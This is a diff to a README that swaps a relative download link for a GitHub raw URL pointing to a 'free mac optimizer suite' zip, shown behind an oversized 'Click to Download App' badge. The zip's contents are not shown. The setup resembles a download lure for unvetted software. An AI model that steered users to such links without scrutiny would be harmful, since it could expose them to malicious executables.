@@ -4,9 +4,9 @@
 <p align="center">
 
   <!-- Download Button -->
-  <a href="./mac-optimizer.zip">
-    <img src="https://img.shields.io/badge/Click%20to%20Download%20App-blue?style=for-the-badge&logo=apple&logoColor=white&labelColor=000000&color=1e90ff" width="200" height="200">
-  </a>
+<a href="https://github.com/aazad612/free-mac-optimizer-suite/raw/main/mac-optimizer.zip?download=1">
+  <img src="https://img.shields.io/badge/Click%20to%20Download%20App-blue?style=for-the-badge&logo=apple&logoColor=white&labelColor=000000&color=1e90ff" width="200" height="200">
+</a>
 
 
 </p>
